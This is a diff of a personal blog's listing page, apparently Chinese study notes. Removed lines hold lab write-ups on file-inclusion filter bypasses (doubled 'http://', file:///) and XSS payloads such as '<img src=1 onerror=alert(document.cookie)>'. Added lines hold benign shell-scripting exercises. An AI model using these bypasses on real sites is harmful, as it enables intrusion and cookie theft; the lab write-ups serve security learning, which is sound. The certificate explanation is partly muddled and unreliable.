-<p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”https://”、 ” ../”、”..”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
-<p>2.文件包含的限制绕过 使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=hthttp://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</p>
-<p>通过大小写也可以绕过。</p>
-<p>相对路径可以通过以下方式绕过。</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png"></p>
-<h2 id="高等级">高等级</h2>
-<p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
-<p>2.漏洞利用 High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
-<p>我们在前面加上file:///就可以打开文件</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/" class="post-title-link" itemprop="url">信息安全概论（2）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-16 17:32:27" itemprop="dateCreated datePublished" datetime="2022-03-16T17:32:27+08:00">2022-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-19 10:45:40" itemprop="dateModified" datetime="2022-03-19T10:45:40+08:00">2022-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论2">信息安全概论（2）</h1>
-<h2 id="密码学基本概念加密和解密">2.1 密码学基本概念——加密和解密</h2>
-<h3 id="机密与真实性的解决方法加密">机密与真实性的解决方法——加密</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR;</span><br><span class="line">  明文--加密算法 加密密钥--&gt;密文</span><br><span class="line">  密文--解密算法 解密密钥--&gt;明文</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="两种密码体制">两种密码体制</h3>
-<h4 id="单钥密码体制">单钥密码体制</h4>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316164218625.png"></p>
-<blockquote>
-<p>加密密钥和解密密钥相同，或能相互推导</p>
-</blockquote>
-<p>单钥算法不能提供抗抵赖保护。</p>
-<ol type="1">
-<li>数据世界中，复制件和原件是不可区分的。</li>
-<li>通信双方对密文Y有对等的生产能力。</li>
-</ol>
-<p>所以单钥密码算法也被称为对称密码算法。</p>
-<p>单钥密码加密的应用条件：</p>
-<p>​ 需要敌人拿不到数据的安全信道传递共用的密钥。</p>
-<h4 id="双钥密码体制">双钥密码体制</h4>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316164723920.png"></p>
-<blockquote>
-<p>加密密钥和解密密钥不相同，且不能相互推导</p>
-</blockquote>
-<p>双钥算法之一 —— RSA算法</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316172136374.png"></p>
-<p>加密：<span class="math inline">\(c=m^e \mod {n}\)</span></p>
-<p>解密：<span class="math inline">\(c^d \mod n = m\)</span></p>
-<blockquote>
-<p>知道加密密钥推断不出解密密钥</p>
-</blockquote>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220316174502949.png"></p>
-<p>假设一个场景：A与B要进行通信，C为可能的窃听者，双钥密码体制工作如下。</p>
-<p><strong>工作流程：</strong></p>
-<ol type="1">
-<li>由A产生加密密钥和解密密钥</li>
-<li>A将加密密钥公开出去，B和C都能接收到加密密钥。</li>
-<li>B通过加密密钥加密明文发送给A，A通过解密密钥就可以解密出明文。</li>
-</ol>
-<p>这个过程中就可以不通过安全信道传输信息他，同时通过加密密钥也不能推导出解密密钥，所以信息可以安全的传输。</p>
-<h4 id="双钥密码小结">2.3.4 双钥密码小结</h4>
-<p>两把钥匙：加密能力和解密能力是非对称的。</p>
-<p><strong>公开加密密钥：</strong></p>
-<p>目的：机密性</p>
-<p>优点：降低对安全信道的依赖</p>
-<table>
-<thead>
-<tr class="header">
-<th>机密性</th>
-<th>可鉴别性</th>
-<th>完整性</th>
-<th>抗抵赖性</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>√</td>
-<td>×</td>
-<td>√</td>
-<td>×</td>
-</tr>
-</tbody>
-</table>
-<p><strong>公开解密密钥：</strong></p>
-<p>目的：真实性</p>
-<p>优点：提供了抗抵赖的”证据“</p>
-<table>
-<thead>
-<tr class="header">
-<th>机密性</th>
-<th>可鉴别性</th>
-<th>完整性</th>
-<th>抗抵赖性</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>×</td>
-<td>√</td>
-<td>√</td>
-<td>√</td>
-</tr>
-</tbody>
-</table>
-<h4 id="数字签名的基本原理和物理签名的区别"><strong>2.6.1 数字签名的基本原理和物理签名的区别</strong></h4>
-<p><strong>物理签名：</strong>基于物理载体不可伪造，通过物理载体对其上的内容负责。</p>
-<p><strong>数字签名：</strong>直接基于数据内容不可伪造，没有物理载体。</p>
-<h4 id="数字签名与数字证书">2.7.1 数字签名与数字证书</h4>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(2)/image-20220318141759531.png"></p>
-<p>我们以用户向服务器传输加密数据来阐述证书、公私钥和可信第三方的关系：</p>
-<ol type="1">
-<li><p>可信第三方产生公私钥，用私钥对服务器信息进行加密，然后将公钥公布出去。</p></li>
-<li><p>用户向服务器传输数据的时候，先用公钥对签名信息进行解密。</p>
-<blockquote>
-<p>这一步可以保证数据的真实性，因为是可信第三方签名认证的。</p>
-</blockquote></li>
-<li><p>接着服务器通过公开的加密私钥对数据进行加密，将数据传输给服务器。</p>
-<blockquote>
-<p>这一步可以保证数据的机密性，用这个公钥给服务器发送的机密数据，只有服务器可以解开。</p>
-</blockquote></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/" class="post-title-link" itemprop="url">信息安全概论（1）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-03-16 15:57:27 / Modified: 21:35:08" itemprop="dateCreated datePublished" datetime="2022-03-16T15:57:27+08:00">2022-03-16</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论1">信息安全概论（1）</h1>
-<h2 id="安全风险分析与安全对策">1.1.1安全风险分析与安全对策</h2>
-<h2 id="安全分析">安全分析</h2>
-<p>要保护对象的<strong>价值、弱点、威胁</strong></p>
-<h3 id="安全对策pdrrp">安全对策（<strong>PDRR</strong>P）</h3>
-<ul>
-<li><strong>保护</strong></li>
-<li><strong>检测</strong></li>
-<li><strong>反应</strong></li>
-<li><strong>恢复</strong></li>
-<li>惩罚</li>
-</ul>
-<h2 id="可用性真实性机密性">1.2.1 可用性、真实性、机密性</h2>
-<h3 id="信息的可用性">信息的可用性</h3>
-<p>信息系统提供服务的能力</p>
-<blockquote>
-<ul>
-<li>病毒导致的计算机系统瘫痪</li>
-<li>蠕虫导致网络堵塞瘫痪</li>
-<li>黑客进行的拒绝服务攻击</li>
-</ul>
-</blockquote>
-<h3 id="信息的真实性">信息的真实性</h3>
-<ul>
-<li><p>可鉴别性</p>
-<blockquote>
-<p>是周瑜发给我的还是曹操发给我的</p>
-</blockquote></li>
-<li><p>完整性</p>
-<blockquote>
-<p>是不是发送过程中被改了</p>
-</blockquote></li>
-<li><p>抗抵赖 (面对双方不可信的条件下,提供保障)</p></li>
-</ul>
-<h3 id="信息的机密性">信息的机密性</h3>
-<p>9月14日组织进攻</p>
-<p><img src="/2022/03/16/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA/image-20220316094317271.png"></p>
-<h2 id="信息安全模型">1.3.1 信息安全模型</h2>
-<p>信息安全模型：信息在传输、存储和处理过程中保护信息的<strong>CIA</strong></p>
-<blockquote>
-<p>机密性：Confidentiality</p>
-<p>完整性：Integrity</p>
-<p>可用性 ：Availability</p>
-</blockquote>
-<h2 id="信息时代和信息的价值">1.4.1 信息时代和信息的价值</h2>
-<p><strong>数据</strong> ： 客观事物的符号表示。</p>
-<p><strong>信息</strong> ：有用的数据，能消除主体疑问的数据，能指导主体的行为的数据。</p>
-<ul>
-<li>数据是信息的载体，但信息不等于数据。</li>
-<li>数据中包含信息，但得到数据未必能得到信息，即能指导主体行为。</li>
-</ul>
-<h2 id="信息系统的弱点">1.5.1 信息系统的弱点</h2>
-<ol type="1">
-<li>设计上的问题——通常缺乏安全的考虑，比如 <span class="math inline">\(arp\)</span> 病毒。</li>
-<li>实现上的问题——代码编写中，有意后门和无意的bug。</li>
-<li>配置上的问题——默认的服务。</li>
-<li>管理上的问题——弱的口令，内部人员无意或恶意的操作。</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/" class="post-title-link" itemprop="url">XSS笔记</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-08 10:27:27" itemprop="dateCreated datePublished" datetime="2022-03-08T10:27:27+08:00">2022-03-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-16 21:35:08" itemprop="dateModified" datetime="2022-03-16T21:35:08+08:00">2022-03-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="xss笔记">XSS笔记</h1>
-<h2 id="xss简介">XSS简介</h2>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308095657142.png"></p>
-<blockquote>
-<p>反射型XSS只会中招一次，存储型XSS每次打开都会中招，很烦人。DOM型XSS接触的不多。</p>
-</blockquote>
-<h2 id="反射型xss漏洞">反射型XSS漏洞</h2>
-<h3 id="低等级">低等级</h3>
-<p>代码直接引用了name参数，并没有做任何过滤和检查，存在明显的XSS漏洞。</p>
-<p>在对话框键入<code>&lt;script&gt;alert("111")&lt;/script&gt;</code> 就完成了一次低等级的XSS攻击。</p>
-<p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308100719863.png"></p>
-<h3 id="中等级">中等级</h3>
-<p>观察代码发现对输入的数据进行的过滤，将script关键词删除，但是这种机制很容易被绕过。</p>
-<ol type="1">
-<li>这时我们可以通过输入<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code> 伪装外部的<code>&lt;script&gt;</code> 进行攻击。</li>
-</ol>
-<p>可以看到浏览器成功弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ ls -lhat --color</span><br><span class="line">total 0</span><br><span class="line">-rw-r--r-- 1 rust rust    7 Mar 27 16:18 foo1</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 22:01 ..</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:55 .</span><br><span class="line">-rwxrwxrwx 1 rust rust   83 Mar 26 18:55 script.py</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:19 bar</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 18:19 foo</span><br><span class="line">-rw-r--r-- 1 rust rust    0 Mar 26 18:11 foo10</span><br><span class="line">-rw-r--r-- 1 rust rust    0 Mar 26 18:11 foo2</span><br><span class="line">drwxr-xr-x 1 rust rust 4.0K Mar 26 17:14 b</span><br></pre></td></tr></table></figure>
 <ol start="2" type="1">
-<li>我们还可以通过混用大小写的方式进行XSS攻击</li>
+<li></li>
 </ol>
-<p>我们输入<code>&lt;ScriPt&gt;alert(111)&lt;/script&gt;</code> ，点击<span class="math inline">\(submit\)</span> 进行提交也可以看到成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308102802413.png"></p>
-<p>​</p>
-<h3 id="高等级">高等级</h3>
-<p>观察代码发现使用黑名单过滤输入，其中preg_replace()函数用于正则表达式的搜索和替换，这使双写绕过和大小写混写绕过全部失效。</p>
-<p>我们可以通过 <span class="math inline">\(img\)</span> , <span class="math inline">\(body\)</span> 等标签注入js代码。</p>
-<p>我们在对话框中输入代码： <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
-<p>提交后可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png"></p>
-<h2 id="存储型xss漏洞">存储型XSS漏洞</h2>
-<h3 id="低等级-1">低等级</h3>
-<p>strip_tags()函数可以剥去字符串中的HTML，XML以及PHP的标签，但允许使用标签。 addslashes()函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加 反斜杠的字符串。 可以看到，由于对message参数使用了htmlspecialchars函数进行编码，无法在使用 message参数注入XSS代码，但是对于name参数，只是简单过滤了标签，所以仍存在存储型的XSS 。</p>
-<h4 id="在message进行xss攻击">在message进行xss攻击</h4>
-<p>在message栏输入<code>&lt;script&gt;alert("/xss/")&lt;/script&gt;</code></p>
-<p>可以看到浏览器上方弹出</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png"></p>
-<h4 id="在name进行xss攻击">在name进行xss攻击</h4>
-<p>由于name进行了输入字数的限制，我们用burp进行抓包。</p>
-<p>在name栏输入123，message栏输入123。在burp中的proxy栏打开intercept is on进行抓包。</p>
-<p>抓包结果如下：</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308160339068.png"></p>
-<p>将txtname改为<code>&lt;script&gt;alert("/xss/")&lt;/script&gt;</code>，放开包，发现浏览器成功弹窗。</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308155737502.png"></p>
-<h3 id="中等级-1">中等级</h3>
-<p>基于黑名单思想，使用str_replace()函数，将script关键词删除，但是这种机制是很容易绕过去的。</p>
-<p>同理用burp进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163010214.png"></p>
-<p>将message改为 <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;</code></p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308101757917.png"></p>
-<p>可以看到成功弹窗</p>
-<h3 id="高等级-1">高等级</h3>
-<p>同理进行抓包</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308163311721.png">改为 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code></p>
-<p>放包可以看到成功进行了弹窗</p>
-<p><img src="/2022/03/08/%E7%BD%91%E7%BB%9C/xss%E7%AC%94%E8%AE%B0/image-20220308111137012.png"></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">marco.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">marco() &#123;</span><br><span class="line">    export MARCO=$(pwd)</span><br><span class="line">&#125;</span><br><span class="line">polo() &#123;</span><br><span class="line">    cd &quot;$MARCO&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~/missing/test$ source marco.sh</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing/test$ cd ..</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ marco</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$ cd</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ polo</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~/missing$</span><br></pre></td></tr></table></figure>
+<ol start="3" type="1">
+<li></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">count=1</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">     ./buggy.sh 2&gt; out.log</span><br><span class="line">     <span class="keyword">if</span> [[ $? -ne 0 ]]; <span class="keyword">then</span></span><br><span class="line">         <span class="built_in">echo</span> <span class="string">&quot;failed after <span class="variable">$count</span> times&quot;</span></span><br><span class="line">         cat out.log</span><br><span class="line">         <span class="built_in">break</span></span><br><span class="line">     <span class="keyword">fi</span></span><br><span class="line">     ((count++))</span><br><span class="line"></span><br><span class="line"> <span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1169,7 +934,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/02/24/%E6%8A%A4%E7%BD%91/">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1183,7 +948,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2022/02/24/%E6%8A%A4%E7%BD%91/" class="post-title-link" itemprop="url">Untitled</a>
+            <a href="/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/" class="post-title-link" itemprop="url">Shell Tools and Scripting</a>
         </h2>
 
         <div class="post-meta">
@@ -1193,7 +958,23 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2022-02-24 11:24:04" itemprop="dateCreated datePublished" datetime="2022-02-24T11:24:04+08:00">2022-02-24</time>
+              <time title="Created: 2022-03-26 14:01:27" itemprop="dateCreated datePublished" datetime="2022-03-26T14:01:27+08:00">2022-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:43:15" itemprop="dateModified" datetime="2022-03-30T21:43:15+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
             </span>
 
           
@@ -1207,8 +988,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
-
+          <h1 id="shell-tools-and-scripting">Shell Tools and Scripting</h1>
+<p>shell可以定义变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ foo=bar</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">bar</span><br></pre></td></tr></table></figure>
+<p>用空格分开会被认为是可执行程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ foo = bar</span><br><span class="line">Command &#x27;foo&#x27; not found, did you mean:</span><br></pre></td></tr></table></figure>
+<p>在打印字符串的时候，单引号和双引号相同</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &quot;Hello&quot;</span><br><span class="line">Hello</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &#x27;World&#x27;</span><br><span class="line">World</span><br></pre></td></tr></table></figure>
+<p>但是在打印变量的时候，单引号不会替换变量</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &quot;Value is $foo&quot;</span><br><span class="line">Value is bar</span><br><span class="line">rust@DESKTOP-L4PLVQ4:~$ echo &#x27;Value is $foo&#x27;</span><br><span class="line">Value is $foo</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/26/missing-semester/Shell%20Tools%20and%20Scripting/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1226,7 +1022,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -1292,14 +1088,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-count">12</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
